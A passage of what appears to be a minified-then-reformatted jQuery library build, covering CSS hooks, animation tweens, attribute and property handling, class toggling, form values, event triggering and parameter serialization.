      gridColumnEnd: true,
      gridColumnStart: true,
      gridRow: true,
      gridRowEnd: true,
      gridRowStart: true,
      lineHeight: true,
      opacity: true,
      order: true,
      orphans: true,
      widows: true,
      zIndex: true,
      zoom: true
    },
    cssProps: {},
    style: function (e, t, n, r) {
      if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
        var i;
        var o;
        var a;
        var s = t.replace(F, "ms-").replace(z, X);
        var u = e8.test(t);
        var l = e.style;
        if (!u) {
          t = eR(s);
        }
        a = b.cssHooks[t] || b.cssHooks[s];
        if (undefined === n) {
          return a && "get" in a && undefined !== (i = a.get(e, false, r)) ? i : l[t];
        }
        if ("string" == (o = typeof n) && (i = et.exec(n)) && i[1]) {
          n = es(e, t, i);
          o = "number";
        }
        if (null != n && n == n) {
          if (!("number" !== o || u)) {
            n += i && i[3] || (b.cssNumber[s] ? "" : "px");
          }
          if (!(d.clearCloneStyle || "" !== n || 0 !== t.indexOf("background"))) {
            l[t] = "inherit";
          }
          if (!(a && "set" in a && undefined === (n = a.set(e, n, r)))) {
            if (u) {
              l.setProperty(t, n);
            } else {
              l[t] = n;
            }
          }
        }
      }
    },
    css: function (e, t, n, r) {
      var i;
      var o;
      var a;
      var s = t.replace(F, "ms-").replace(z, X);
      if (!e8.test(t)) {
        t = eR(s);
      }
      if ((a = b.cssHooks[t] || b.cssHooks[s]) && "get" in a) {
        i = a.get(e, true, n);
      }
      if (undefined === i) {
        i = eM(e, t, r);
      }
      if ("normal" === i && t in eX) {
        i = eX[t];
      }
      return "" === n || n ? (o = parseFloat(i), true === n || isFinite(o) ? o || 0 : i) : i;
    }
  });
  b.each(["height", "width"], function (e, t) {
    b.cssHooks[t] = {
      get: function (e, n, r) {
        if (n) {
          return !eF.test(b.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? eU(e, t, r) : e0(e, ez, function () {
            return eU(e, t, r);
          });
        }
      },
      set: function (e, n, r) {
        var i;
        var o = eO(e);
        var a = !d.scrollboxSize() && "absolute" === o.position;
        var s = (a || r) && "border-box" === b.css(e, "boxSizing", false, o);
        var u = r ? e4(e, t, r, s, o) : 0;
        if (s && a) {
          u -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - e4(e, t, "border", false, o) - 0.5);
        }
        if (u && (i = et.exec(n)) && "px" !== (i[3] || "px")) {
          e.style[t] = n;
          n = b.css(e, t);
        }
        return e2(0, n, u);
      }
    };
  });
  b.cssHooks.marginLeft = eW(d.reliableMarginLeft, function (e, t) {
    if (t) {
      return (parseFloat(eM(e, "marginLeft")) || e.getBoundingClientRect().left - e0(e, {
        marginLeft: 0
      }, function () {
        return e.getBoundingClientRect().left;
      })) + "px";
    }
  });
  b.each({
    margin: "",
    padding: "",
    border: "Width"
  }, function (e, t) {
    b.cssHooks[e + t] = {
      expand: function (n) {
        var r = 0;
        var i = {};
        for (var o = "string" == typeof n ? n.split(" ") : [n]; r < 4; r++) {
          i[e + en[r] + t] = o[r] || o[r - 2] || o[0];
        }
        return i;
      }
    };
    if ("margin" !== e) {
      b.cssHooks[e + t].set = e2;
    }
  });
  b.fn.extend({
    css: function (e, t) {
      return R(this, function (e, t, n) {
        var r;
        var i;
        var o = {};
        var a = 0;
        if (Array.isArray(t)) {
          r = eO(e);
          for (i = t.length; a < i; a++) {
            o[t[a]] = b.css(e, t[a], false, r);
          }
          return o;
        }
        return undefined !== n ? b.style(e, t, n) : b.css(e, t);
      }, e, t, arguments.length > 1);
    }
  });
  b.Tween = e3;
  e3.prototype = {
    constructor: e3,
    init: function (e, t, n, r, i, o) {
      this.elem = e;
      this.prop = n;
      this.easing = i || b.easing._default;
      this.options = t;
      this.start = this.now = this.cur();
      this.end = r;
      this.unit = o || (b.cssNumber[n] ? "" : "px");
    },
    cur: function () {
      var e = e3.propHooks[this.prop];
      return e && e.get ? e.get(this) : e3.propHooks._default.get(this);
    },
    run: function (e) {
      var t;
      var n = e3.propHooks[this.prop];
      if (this.options.duration) {
        this.pos = t = b.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration);
      } else {
        this.pos = t = e;
      }
      this.now = (this.end - this.start) * t + this.start;
      if (this.options.step) {
        this.options.step.call(this.elem, this.now, this);
      }
      if (n && n.set) {
        n.set(this);
      } else {
        e3.propHooks._default.set(this);
      }
      return this;
    }
  };
  e3.prototype.init.prototype = e3.prototype;
  e3.propHooks = {
    _default: {
      get: function (e) {
        var t;
        return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = b.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0;
      },
      set: function (e) {
        if (b.fx.step[e.prop]) {
          b.fx.step[e.prop](e);
        } else if (1 === e.elem.nodeType && (b.cssHooks[e.prop] || null != e.elem.style[eR(e.prop)])) {
          b.style(e.elem, e.prop, e.now + e.unit);
        } else {
          e.elem[e.prop] = e.now;
        }
      }
    }
  };
  e3.propHooks.scrollTop = e3.propHooks.scrollLeft = {
    set: function (e) {
      if (e.elem.nodeType && e.elem.parentNode) {
        e.elem[e.prop] = e.now;
      }
    }
  };
  b.easing = {
    linear: function (e) {
      return e;
    },
    swing: function (e) {
      return 0.5 - Math.cos(e * Math.PI) / 2;
    },
    _default: "swing"
  };
  b.fx = e3.prototype.init;
  b.fx.step = {};
  var e7;
  var eV;
  var eG = /^(?:toggle|show|hide)$/;
  var eY = /queueHooks$/;
  function eQ() {
    e.setTimeout(function () {
      e7 = undefined;
    });
    return e7 = Date.now();
  }
  function e6(e, t) {
    var n;
    var r = 0;
    var i = {
      height: e
    };
    for (t = t ? 1 : 0; r < 4; r += 2 - t) {
      i["margin" + (n = en[r])] = i["padding" + n] = e;
    }
    if (t) {
      i.opacity = i.width = e;
    }
    return i;
  }
  function eK(e, t, n) {
    var r;
    var i = (e5.tweeners[t] || []).concat(e5.tweeners["*"]);
    var o = 0;
    for (var a = i.length; o < a; o++) {
      if (r = i[o].call(n, t, e)) {
        return r;
      }
    }
  }
  function e5(e, t, n) {
    var r;
    var i;
    var o = 0;
    var a = e5.prefilters.length;
    var s = b.Deferred().always(function () {
      delete u.elem;
    });
    var u = function () {
      if (i) {
        return false;
      }
      var t = e7 || eQ();
      var n = Math.max(0, l.startTime + l.duration - t);
      var r = 1 - (n / l.duration || 0);
      var o = 0;
      for (var a = l.tweens.length; o < a; o++) {
        l.tweens[o].run(r);
      }
      s.notifyWith(e, [l, r, n]);
      return r < 1 && a ? n : (a || s.notifyWith(e, [l, 1, 0]), s.resolveWith(e, [l]), false);
    };
    var l = s.promise({
      elem: e,
      props: b.extend({}, t),
      opts: b.extend(true, {
        specialEasing: {},
        easing: b.easing._default
      }, n),
      originalProperties: t,
      originalOptions: n,
      startTime: e7 || eQ(),
      duration: n.duration,
      tweens: [],
      createTween: function (t, n) {
        var r = b.Tween(e, l.opts, t, n, l.opts.specialEasing[t] || l.opts.easing);
        l.tweens.push(r);
        return r;
      },
      stop: function (t) {
        var n = 0;
        var r = t ? l.tweens.length : 0;
        if (i) {
          return this;
        }
        for (i = true; n < r; n++) {
          l.tweens[n].run(1);
        }
        if (t) {
          s.notifyWith(e, [l, 1, 0]);
          s.resolveWith(e, [l, t]);
        } else {
          s.rejectWith(e, [l, t]);
        }
        return this;
      }
    });
    var c = l.props;
    for (!function (e, t) {
      var n;
      var r;
      var i;
      var o;
      var a;
      for (n in e) {
        i = t[r = n.replace(F, "ms-").replace(z, X)];
        if (Array.isArray(o = e[n])) {
          i = o[1];
          o = e[n] = o[0];
        }
        if (n !== r) {
          e[r] = o;
          delete e[n];
        }
        if ((a = b.cssHooks[r]) && "expand" in a) {
          o = a.expand(o);
          delete e[r];
          for (n in o) if (!(n in e)) {
            e[n] = o[n];
            t[n] = i;
          }
        } else {
          t[r] = i;
        }
      }
    }(c, l.opts.specialEasing); o < a; o++) {
      if (r = e5.prefilters[o].call(l, e, c, l.opts)) {
        if ("function" == typeof r.stop && "number" != typeof r.stop.nodeType && "function" != typeof r.stop.item) {
          b._queueHooks(l.elem, l.opts.queue).stop = r.stop.bind(r);
        }
        return r;
      }
    }
    b.map(c, eK, l);
    if ("function" == typeof l.opts.start && "number" != typeof l.opts.start.nodeType && "function" != typeof l.opts.start.item) {
      l.opts.start.call(e, l);
    }
    l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always);
    b.fx.timer(b.extend(u, {
      elem: e,
      anim: l,
      queue: l.opts.queue
    }));
    return l;
  }
  b.Animation = b.extend(e5, {
    tweeners: {
      "*": [function (e, t) {
        var n = this.createTween(e, t);
        es(n.elem, e, et.exec(t), n);
        return n;
      }]
    },
    tweener: function (e, t) {
      if ("function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item) {
        t = e;
        e = ["*"];
      } else {
        e = e.match(H);
      }
      var n;
      var r = 0;
      for (var i = e.length; r < i; r++) {
        n = e[r];
        e5.tweeners[n] = e5.tweeners[n] || [];
        e5.tweeners[n].unshift(t);
      }
    },
    prefilters: [function (e, t, n) {
      var r;
      var i;
      var o;
      var a;
      var s;
      var u;
      var l;
      var c;
      var f = "width" in t || "height" in t;
      var p = this;
      var d = {};
      var h = e.style;
      var g = e.nodeType && ea(e);
      var v = Y.get(e, "fxshow");
      if (!n.queue) {
        if (null == (a = b._queueHooks(e, "fx")).unqueued) {
          a.unqueued = 0;
          s = a.empty.fire;
          a.empty.fire = function () {
            if (!a.unqueued) {
              s();
            }
          };
        }
        a.unqueued++;
        p.always(function () {
          p.always(function () {
            a.unqueued--;
            if (!b.queue(e, "fx").length) {
              a.empty.fire();
            }
          });
        });
      }
      for (r in t) {
        i = t[r];
        if (eG.test(i)) {
          delete t[r];
          o = o || "toggle" === i;
          if (i === (g ? "hide" : "show")) {
            if ("show" !== i || !v || undefined === v[r]) {
              continue;
            }
            g = true;
          }
          d[r] = v && v[r] || b.style(e, r);
        }
      }
      if ((u = !b.isEmptyObject(t)) || !b.isEmptyObject(d)) {
        if (f && 1 === e.nodeType) {
          n.overflow = [h.overflow, h.overflowX, h.overflowY];
          if (null == (l = v && v.display)) {
            l = Y.get(e, "display");
          }
          if ("none" === (c = b.css(e, "display"))) {
            if (l) {
              c = l;
            } else {
              ec([e], true);
              l = e.style.display || l;
              c = b.css(e, "display");
              ec([e]);
            }
          }
          if (("inline" === c || "inline-block" === c && null != l) && "none" === b.css(e, "float")) {
            if (!u) {
              p.done(function () {
                h.display = l;
              });
              if (null == l) {
                l = "none" === (c = h.display) ? "" : c;
              }
            }
            h.display = "inline-block";
          }
        }
        if (n.overflow) {
          h.overflow = "hidden";
          p.always(function () {
            h.overflow = n.overflow[0];
            h.overflowX = n.overflow[1];
            h.overflowY = n.overflow[2];
          });
        }
        u = false;
        for (r in d) {
          if (!u) {
            if (v) {
              if ("hidden" in v) {
                g = v.hidden;
              }
            } else {
              v = Y.access(e, "fxshow", {
                display: l
              });
            }
            if (o) {
              v.hidden = !g;
            }
            if (g) {
              ec([e], true);
            }
            p.done(function () {
              if (!g) {
                ec([e]);
              }
              Y.remove(e, "fxshow");
              for (r in d) b.style(e, r, d[r]);
            });
          }
          u = eK(g ? v[r] : 0, r, p);
          if (!(r in v)) {
            v[r] = u.start;
            if (g) {
              u.end = u.start;
              u.start = 0;
            }
          }
        }
      }
    }],
    prefilter: function (e, t) {
      if (t) {
        e5.prefilters.unshift(e);
      } else {
        e5.prefilters.push(e);
      }
    }
  });
  b.speed = function (e, t, n) {
    var r = e && "object" == typeof e ? b.extend({}, e) : {
      complete: n || !n && t || "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item && e,
      duration: e,
      easing: n && t || t && !("function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item) && t
    };
    if (b.fx.off) {
      r.duration = 0;
    } else if ("number" != typeof r.duration) {
      if (r.duration in b.fx.speeds) {
        r.duration = b.fx.speeds[r.duration];
      } else {
        r.duration = b.fx.speeds._default;
      }
    }
    if (!(null != r.queue && true !== r.queue)) {
      r.queue = "fx";
    }
    r.old = r.complete;
    r.complete = function () {
      if ("function" == typeof r.old && "number" != typeof r.old.nodeType && "function" != typeof r.old.item) {
        r.old.call(this);
      }
      if (r.queue) {
        b.dequeue(this, r.queue);
      }
    };
    return r;
  };
  b.fn.extend({
    fadeTo: function (e, t, n, r) {
      return this.filter(ea).css("opacity", 0).show().end().animate({
        opacity: t
      }, e, n, r);
    },
    animate: function (e, t, n, r) {
      var i = b.isEmptyObject(e);
      var o = b.speed(t, n, r);
      var a = function () {
        var t = e5(this, b.extend({}, e), o);
        if (i || Y.get(this, "finish")) {
          t.stop(true);
        }
      };
      a.finish = a;
      return i || false === o.queue ? this.each(a) : this.queue(o.queue, a);
    },
    stop: function (e, t, n) {
      var r = function (e) {
        var t = e.stop;
        delete e.stop;
        t(n);
      };
      if ("string" != typeof e) {
        n = t;
        t = e;
        e = undefined;
      }
      if (t) {
        this.queue(e || "fx", []);
      }
      return this.each(function () {
        var t = true;
        var i = null != e && e + "queueHooks";
        var o = b.timers;
        var a = Y.get(this);
        if (i) {
          if (a[i] && a[i].stop) {
            r(a[i]);
          }
        } else {
          for (i in a) if (a[i] && a[i].stop && eY.test(i)) {
            r(a[i]);
          }
        }
        for (i = o.length; i--;) {
          if (!(o[i].elem !== this || null != e && o[i].queue !== e)) {
            o[i].anim.stop(n);
            t = false;
            o.splice(i, 1);
          }
        }
        if (!(!t && n)) {
          b.dequeue(this, e);
        }
      });
    },
    finish: function (e) {
      if (false !== e) {
        e = e || "fx";
      }
      return this.each(function () {
        var t;
        var n = Y.get(this);
        var r = n[e + "queue"];
        var i = n[e + "queueHooks"];
        var o = b.timers;
        var a = r ? r.length : 0;
        n.finish = true;
        b.queue(this, e, []);
        if (i && i.stop) {
          i.stop.call(this, true);
        }
        for (t = o.length; t--;) {
          if (o[t].elem === this && o[t].queue === e) {
            o[t].anim.stop(true);
            o.splice(t, 1);
          }
        }
        for (t = 0; t < a; t++) {
          if (r[t] && r[t].finish) {
            r[t].finish.call(this);
          }
        }
        delete n.finish;
      });
    }
  });
  b.each(["toggle", "show", "hide"], function (e, t) {
    var n = b.fn[t];
    b.fn[t] = function (e, r, i) {
      return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(e6(t, true), e, r, i);
    };
  });
  b.each({
    slideDown: e6("show"),
    slideUp: e6("hide"),
    slideToggle: e6("toggle"),
    fadeIn: {
      opacity: "show"
    },
    fadeOut: {
      opacity: "hide"
    },
    fadeToggle: {
      opacity: "toggle"
    }
  }, function (e, t) {
    b.fn[e] = function (e, n, r) {
      return this.animate(t, e, n, r);
    };
  });
  b.timers = [];
  b.fx.tick = function () {
    var e;
    var t = 0;
    var n = b.timers;
    for (e7 = Date.now(); t < n.length; t++) {
      if (!((e = n[t])() || n[t] !== e)) {
        n.splice(t--, 1);
      }
    }
    if (!n.length) {
      b.fx.stop();
    }
    e7 = undefined;
  };
  b.fx.timer = function (e) {
    b.timers.push(e);
    b.fx.start();
  };
  b.fx.interval = 13;
  b.fx.start = function () {
    if (!eV) {
      eV = true;
      (function t() {
        if (eV) {
          if (false === v.hidden && e.requestAnimationFrame) {
            e.requestAnimationFrame(t);
          } else {
            e.setTimeout(t, b.fx.interval);
          }
          b.fx.tick();
        }
      })();
    }
  };
  b.fx.stop = function () {
    eV = null;
  };
  b.fx.speeds = {
    slow: 600,
    fast: 200,
    _default: 400
  };
  b.fn.delay = function (t, n) {
    t = b.fx && b.fx.speeds[t] || t;
    n = n || "fx";
    return this.queue(n, function (n, r) {
      var i = e.setTimeout(n, t);
      r.stop = function () {
        e.clearTimeout(i);
      };
    });
  };
  eJ = v.createElement("input");
  eZ = v.createElement("select").appendChild(v.createElement("option"));
  eJ.type = "checkbox";
  d.checkOn = "" !== eJ.value;
  d.optSelected = eZ.selected;
  (eJ = v.createElement("input")).value = "t";
  eJ.type = "radio";
  d.radioValue = "t" === eJ.value;
  var eJ;
  var eZ;
  var te;
  var tt = b.expr.attrHandle;
  b.fn.extend({
    attr: function (e, t) {
      return R(this, b.attr, e, t, arguments.length > 1);
    },
    removeAttr: function (e) {
      return this.each(function () {
        b.removeAttr(this, e);
      });
    }
  });
  b.extend({
    attr: function (e, t, n) {
      var r;
      var i;
      var o = e.nodeType;
      if (3 !== o && 8 !== o && 2 !== o) {
        return undefined === e.getAttribute ? b.prop(e, t, n) : (1 === o && b.isXMLDoc(e) || (i = b.attrHooks[t.toLowerCase()] || (b.expr.match.bool.test(t) ? te : undefined)), undefined !== n ? null === n ? void b.removeAttr(e, t) : i && "set" in i && undefined !== (r = i.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : i && "get" in i && null !== (r = i.get(e, t)) ? r : null == (r = b.find.attr(e, t)) ? undefined : r);
      }
    },
    attrHooks: {
      type: {
        set: function (e, t) {
          if (!d.radioValue && "radio" === t && e.nodeName && e.nodeName.toLowerCase() === "input".toLowerCase()) {
            var n = e.value;
            e.setAttribute("type", t);
            if (n) {
              e.value = n;
            }
            return t;
          }
        }
      }
    },
    removeAttr: function (e, t) {
      var n;
      var r = 0;
      var i = t && t.match(H);
      if (i && 1 === e.nodeType) {
        for (; n = i[r++];) {
          e.removeAttribute(n);
        }
      }
    }
  });
  te = {
    set: function (e, t, n) {
      if (false === t) {
        b.removeAttr(e, n);
      } else {
        e.setAttribute(n, n);
      }
      return n;
    }
  };
  b.each(b.expr.match.bool.source.match(/\w+/g), function (e, t) {
    var n = tt[t] || b.find.attr;
    tt[t] = function (e, t, r) {
      var i;
      var o;
      var a = t.toLowerCase();
      if (!r) {
        o = tt[a];
        tt[a] = i;
        i = null != n(e, t, r) ? a : null;
        tt[a] = o;
      }
      return i;
    };
  });
  var tn = /^(?:input|select|textarea|button)$/i;
  var tr = /^(?:a|area)$/i;
  b.fn.extend({
    prop: function (e, t) {
      return R(this, b.prop, e, t, arguments.length > 1);
    },
    removeProp: function (e) {
      return this.each(function () {
        delete this[b.propFix[e] || e];
      });
    }
  });
  b.extend({
    prop: function (e, t, n) {
      var r;
      var i;
      var o = e.nodeType;
      if (3 !== o && 8 !== o && 2 !== o) {
        if (!(1 === o && b.isXMLDoc(e))) {
          t = b.propFix[t] || t;
          i = b.propHooks[t];
        }
        return undefined !== n ? i && "set" in i && undefined !== (r = i.set(e, n, t)) ? r : e[t] = n : i && "get" in i && null !== (r = i.get(e, t)) ? r : e[t];
      }
    },
    propHooks: {
      tabIndex: {
        get: function (e) {
          var t = b.find.attr(e, "tabindex");
          return t ? parseInt(t, 10) : tn.test(e.nodeName) || tr.test(e.nodeName) && e.href ? 0 : -1;
        }
      }
    },
    propFix: {
      for: "htmlFor",
      class: "className"
    }
  });
  if (!d.optSelected) {
    b.propHooks.selected = {
      get: function (e) {
        var t = e.parentNode;
        if (t && t.parentNode) {
          t.parentNode.selectedIndex;
        }
        return null;
      },
      set: function (e) {
        var t = e.parentNode;
        if (t) {
          t.selectedIndex;
          if (t.parentNode) {
            t.parentNode.selectedIndex;
          }
        }
      }
    };
  }
  b.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () {
    b.propFix[this.toLowerCase()] = this;
  });
  b.fn.extend({
    addClass: function (e) {
      var t;
      var n;
      var r;
      var i;
      var o;
      var a;
      var s;
      var u = 0;
      if ("function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item) {
        return this.each(function (t) {
          new b.fn.init(this, undefined).addClass(e.call(this, t, this.getAttribute && this.getAttribute("class") || ""));
        });
      }
      if ((t = Array.isArray(e) ? e : "string" == typeof e && e.match(H) || []).length) {
        for (; n = this[u++];) {
          i = n.getAttribute && n.getAttribute("class") || "";
          if (r = 1 === n.nodeType && " " + (i.match(H) || []).join(" ") + " ") {
            for (a = 0; o = t[a++];) {
              if (0 > r.indexOf(" " + o + " ")) {
                r += o + " ";
              }
            }
            if (i !== (s = (r.match(H) || []).join(" "))) {
              n.setAttribute("class", s);
            }
          }
        }
      }
      return this;
    },
    removeClass: function (e) {
      var t;
      var n;
      var r;
      var i;
      var o;
      var a;
      var s;
      var u = 0;
      if ("function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item) {
        return this.each(function (t) {
          new b.fn.init(this, undefined).removeClass(e.call(this, t, this.getAttribute && this.getAttribute("class") || ""));
        });
      }
      if (!arguments.length) {
        return this.attr("class", "");
      }
      if ((t = Array.isArray(e) ? e : "string" == typeof e && e.match(H) || []).length) {
        for (; n = this[u++];) {
          i = n.getAttribute && n.getAttribute("class") || "";
          if (r = 1 === n.nodeType && " " + (i.match(H) || []).join(" ") + " ") {
            for (a = 0; o = t[a++];) {
              for (; r.indexOf(" " + o + " ") > -1;) {
                r = r.replace(" " + o + " ", " ");
              }
            }
            if (i !== (s = (r.match(H) || []).join(" "))) {
              n.setAttribute("class", s);
            }
          }
        }
      }
      return this;
    },
    toggleClass: function (e, t) {
      var n = typeof e;
      var r = "string" === n || Array.isArray(e);
      return "boolean" == typeof t && r ? t ? this.addClass(e) : this.removeClass(e) : "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item ? this.each(function (n) {
        new b.fn.init(this, undefined).toggleClass(e.call(this, n, this.getAttribute && this.getAttribute("class") || "", t), t);
      }) : this.each(function () {
        var t;
        var i;
        var o;
        var a;
        if (r) {
          i = 0;
          o = new b.fn.init(this, undefined);
          for (a = Array.isArray(e) ? e : "string" == typeof e && e.match(H) || []; t = a[i++];) {
            if (o.hasClass(t)) {
              o.removeClass(t);
            } else {
              o.addClass(t);
            }
          }
        } else if (!(undefined !== e && "boolean" !== n)) {
          if (t = this.getAttribute && this.getAttribute("class") || "") {
            Y.set(this, "__className__", t);
          }
          if (this.setAttribute) {
            this.setAttribute("class", t || false === e ? "" : Y.get(this, "__className__") || "");
          }
        }
      });
    },
    hasClass: function (e) {
      var t;
      var n;
      var r = 0;
      for (t = " " + e + " "; n = this[r++];) {
        if (1 === n.nodeType && (" " + ((n.getAttribute && n.getAttribute("class") || "").match(H) || []).join(" ") + " ").indexOf(t) > -1) {
          return true;
        }
      }
      return false;
    }
  });
  var ts = /\r/g;
  b.fn.extend({
    val: function (e) {
      var t;
      var n;
      var r;
      var i = this[0];
      return arguments.length ? (r = "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item, this.each(function (n) {
        var i;
        if (1 === this.nodeType) {
          if (null == (i = r ? e.call(this, n, new b.fn.init(this, undefined).val()) : e)) {
            i = "";
          } else if ("number" == typeof i) {
            i += "";
          } else if (Array.isArray(i)) {
            i = b.map(i, function (e) {
              return null == e ? "" : e + "";
            });
          }
          if (!((t = b.valHooks[this.type] || b.valHooks[this.nodeName.toLowerCase()]) && "set" in t && undefined !== t.set(this, i, "value"))) {
            this.value = i;
          }
        }
      })) : i ? (t = b.valHooks[i.type] || b.valHooks[i.nodeName.toLowerCase()]) && "get" in t && undefined !== (n = t.get(i, "value")) ? n : "string" == typeof (n = i.value) ? n.replace(ts, "") : null == n ? "" : n : undefined;
    }
  });
  b.extend({
    valHooks: {
      option: {
        get: function (e) {
          var t = b.find.attr(e, "value");
          return null != t ? t : (b.text(e).match(H) || []).join(" ");
        }
      },
      select: {
        get: function (e) {
          var t;
          var n;
          var r;
          var i = e.options;
          var o = e.selectedIndex;
          var a = "select-one" === e.type;
          var s = a ? null : [];
          var u = a ? o + 1 : i.length;
          for (r = o < 0 ? u : a ? o : 0; r < u; r++) {
            if (((n = i[r]).selected || r === o) && !n.disabled && (!n.parentNode.disabled || !(n.parentNode.nodeName && n.parentNode.nodeName.toLowerCase() === "optgroup".toLowerCase()))) {
              t = new b.fn.init(n, undefined).val();
              if (a) {
                return t;
              }
              s.push(t);
            }
          }
          return s;
        },
        set: function (e, t) {
          var n;
          var r;
          var i = e.options;
          var o = b.makeArray(t);
          for (var a = i.length; a--;) {
            if ((r = i[a]).selected = b.inArray(b.valHooks.option.get(r), o) > -1) {
              n = true;
            }
          }
          if (!n) {
            e.selectedIndex = -1;
          }
          return o;
        }
      }
    }
  });
  b.each(["radio", "checkbox"], function () {
    b.valHooks[this] = {
      set: function (e, t) {
        if (Array.isArray(t)) {
          return e.checked = b.inArray(new b.fn.init(e, undefined).val(), t) > -1;
        }
      }
    };
    if (!d.checkOn) {
      b.valHooks[this].get = function (e) {
        return null === e.getAttribute("value") ? "on" : e.value;
      };
    }
  });
  d.focusin = "onfocusin" in e;
  var tu = /^(?:focusinfocus|focusoutblur)$/;
  var tl = function (e) {
    e.stopPropagation();
  };
  b.extend(b.event, {
    trigger: function (t, n, r, i) {
      var o;
      var a;
      var s;
      var u;
      var l;
      var f;
      var p;
      var d;
      var m = [r || v];
      var y = c.call(t, "type") ? t.type : t;
      var x = c.call(t, "namespace") ? t.namespace.split(".") : [];
      a = d = s = r = r || v;
      if (3 !== r.nodeType && 8 !== r.nodeType && !tu.test(y + b.event.triggered) && (y.indexOf(".") > -1 && (y = (x = y.split(".")).shift(), x.sort()), l = 0 > y.indexOf(":") && "on" + y, (t = t[b.expando] ? t : new b.Event(y, "object" == typeof t && t)).isTrigger = i ? 2 : 3, t.namespace = x.join("."), t.rnamespace = t.namespace ? RegExp("(^|\\.)" + x.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = undefined, t.target || (t.target = r), n = null == n ? [t] : b.makeArray(n, [t]), p = b.event.special[y] || {}, i || !p.trigger || false !== p.trigger.apply(r, n))) {
        if (!i && !p.noBubble && !(null != r && r === r.window)) {
          u = p.delegateType || y;
          for (tu.test(u + y) || (a = a.parentNode); a; a = a.parentNode) {
            m.push(a);
            s = a;
          }
          if (s === (r.ownerDocument || v)) {
            m.push(s.defaultView || s.parentWindow || e);
          }
        }
        for (o = 0; (a = m[o++]) && !t.isPropagationStopped();) {
          d = a;
          t.type = o > 1 ? u : p.bindType || y;
          if (f = (Y.get(a, "events") || Object.create(null))[t.type] && Y.get(a, "handle")) {
            f.apply(a, n);
          }
          if ((f = l && a[l]) && f.apply && (1 === a.nodeType || 9 === a.nodeType || !+a.nodeType)) {
            t.result = f.apply(a, n);
            if (false === t.result) {
              t.preventDefault();
            }
          }
        }
        t.type = y;
        if (!(i || t.isDefaultPrevented() || p._default && false !== p._default.apply(m.pop(), n) || !(1 === r.nodeType || 9 === r.nodeType || !+r.nodeType))) {
          if (l && "function" == typeof r[y] && "number" != typeof r[y].nodeType && "function" != typeof r[y].item && !(null != r && r === r.window)) {
            if (s = r[l]) {
              r[l] = null;
            }
            b.event.triggered = y;
            if (t.isPropagationStopped()) {
              d.addEventListener(y, tl);
            }
            r[y]();
            if (t.isPropagationStopped()) {
              d.removeEventListener(y, tl);
            }
            b.event.triggered = undefined;
            if (s) {
              r[l] = s;
            }
          }
        }
        return t.result;
      }
    },
    simulate: function (e, t, n) {
      var r = b.extend(new b.Event(), n, {
        type: e,
        isSimulated: true
      });
      b.event.trigger(r, null, t);
    }
  });
  b.fn.extend({
    trigger: function (e, t) {
      return this.each(function () {
        b.event.trigger(e, t, this);
      });
    },
    triggerHandler: function (e, t) {
      var n = this[0];
      if (n) {
        return b.event.trigger(e, t, n, true);
      }
    }
  });
  if (!d.focusin) {
    b.each({
      focus: "focusin",
      blur: "focusout"
    }, function (e, t) {
      var n = function (e) {
        b.event.simulate(t, e.target, b.event.fix(e));
      };
      b.event.special[t] = {
        setup: function () {
          var r = this.ownerDocument || this.document || this;
          var i = Y.access(r, t);
          if (!i) {
            r.addEventListener(e, n, true);
          }
          Y.access(r, t, (i || 0) + 1);
        },
        teardown: function () {
          var r = this.ownerDocument || this.document || this;
          var i = Y.access(r, t) - 1;
          if (i) {
            Y.access(r, t, i);
          } else {
            r.removeEventListener(e, n, true);
            Y.remove(r, t);
          }
        }
      };
    });
  }
  var tc = e.location;
  var tf = {
    guid: Date.now()
  };
  var tp = /\?/;
  b.parseXML = function (t) {
    var n;
    var r;
    if (!t || "string" != typeof t) {
      return null;
    }
    try {
      n = new e.DOMParser().parseFromString(t, "text/xml");
    } catch (i) {}
    r = n && n.getElementsByTagName("parsererror")[0];
    if (!(n && !r)) {
      b.error("Invalid XML: " + (r ? b.map(r.childNodes, function (e) {
        return e.textContent;
      }).join("\n") : t));
    }
    return n;
  };
  var td = /\[\]$/;
  var th = /\r?\n/g;
  var tg = /^(?:submit|button|image|reset|file)$/i;
  var tv = /^(?:input|select|textarea|keygen)/i;
  function tm(e, t, n, r) {
    var i;
    if (Array.isArray(t)) {
      b.each(t, function (t, i) {
        if (n || td.test(e)) {
          r(e, i);
        } else {
          tm(e + "[" + ("object" == typeof i && null != i ? t : "") + "]", i, n, r);
        }
      });
    } else if (n || "object" !== (null == t ? t + "" : "object" == typeof t || "function" == typeof t ? u[l.call(t)] || "object" : typeof t)) {
      r(e, t);
    } else {
      for (i in t) tm(e + "[" + i + "]", t[i], n, r);
    }
  }
  b.param = function (e, t) {
    var n;
    var r = [];
    var i = function (e, t) {
      var n = "function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item ? t() : t;
      r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n);
    };
    if (null == e) {
      return "";
    }
    if (Array.isArray(e) || e.jquery && !b.isPlainObject(e)) {
      b.each(e, function () {
        i(this.name, this.value);
      });
    } else {
      for (n in e) tm(n, e[n], t, i);
    }
    return r.join("&");
  };
  b.fn.extend({
    serialize: function () {
      return b.param(this.serializeArray());
    },
    serializeArray: function () {
      return this.map(function () {
        var e = b.prop(this, "elements");
        return e ? b.makeArray(e) : this;
      }).filter(function () {
        var e = this.type;
